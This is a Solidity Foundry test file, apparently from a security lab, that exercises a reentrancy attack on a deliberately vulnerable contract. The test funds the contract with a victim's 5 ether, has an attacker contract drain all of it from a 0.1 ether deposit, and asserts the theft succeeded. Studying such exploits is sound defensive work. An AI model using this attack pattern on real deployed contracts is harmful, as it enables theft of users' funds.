// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test} from "forge-std/Test.sol";
import {Reentrancy} from "../src/Reentrancy.sol";
import {ReentrancyAttacker} from "../src/ReentrancyAttacker.sol";

contract ReentrancyTest is Test {
    Reentrancy reentrancy;
    ReentrancyAttacker attacker;
    address alice;
    address attackerEOA;

    function setUp() public {
        reentrancy = new Reentrancy();
        alice = makeAddr("alice");
        attackerEOA = makeAddr("attacker");
        vm.deal(alice, 10 ether);
        vm.deal(attackerEOA, 1 ether);
    }

    /// @notice 0.1 ether만 예치한 공격자가 재진입으로 컨트랙트 전액(피해자 돈 포함)을 탈취한다.
    function testDrain() public {
        // 1) 피해자 alice가 5 ether 예치 → 컨트랙트에 자금 적재
        vm.prank(alice);
        reentrancy.donate{value: 5 ether}(alice);
        assertEq(address(reentrancy).balance, 5 ether);

        // 2) 공격자가 0.1 ether로 공격
        vm.prank(attackerEOA);
        attacker = new ReentrancyAttacker(address(reentrancy));
        uint256 deposit = 0.1 ether;
        vm.prank(attackerEOA);
        attacker.attack{value: deposit}();

        // 3) 회수액 > 자기 예치액 (= 남의 돈까지 탈취)
        uint256 loot = address(attacker).balance;
        assertGt(loot, deposit);

        // 4) 컨트랙트 완전 고갈
        assertEq(address(reentrancy).balance, 0);

        // 5) (회수) 탈취액을 공격자 EOA로 인출
        uint256 beforeBal = attackerEOA.balance;
        attacker.collect();
        assertEq(attackerEOA.balance, beforeBal + loot);
        emit log_named_decimal_uint("drained (ether)", loot, 18);
    }
}
